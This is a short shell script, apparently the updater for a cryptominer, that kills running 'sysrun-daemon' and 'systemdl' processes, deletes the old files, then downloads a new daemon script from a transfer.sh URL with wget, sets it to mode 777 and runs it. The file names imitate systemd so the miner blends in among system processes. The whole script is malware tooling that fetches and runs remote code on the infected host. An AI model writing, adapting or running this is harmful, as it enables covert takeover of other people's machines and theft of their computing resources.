#!/bin/sh
#update version
dir="/var/systeml/"
shell="sysrun.sh"
shellPath=$dir$shell

miner="systemdl"
minerPath=$dir$miner

daemon="/var/sysrun-daemon.sh"

# update 
kill -s 9 `ps -aux | grep sysrun-daemon | awk '{print $2}'`
kill -s 9 `ps -aux | grep systemdl | awk '{print $2}'`

rm -rf $shellPath
rm -rf $daemon

#exec
wget -O /var/sysrun-daemon.sh https://transfer.sh/iM9Zj/sysrun-daemon.sh && chmod 777 /var/sysrun-daemon.sh && sh /var/sysrun-daemon.sh
echo 'import finish'
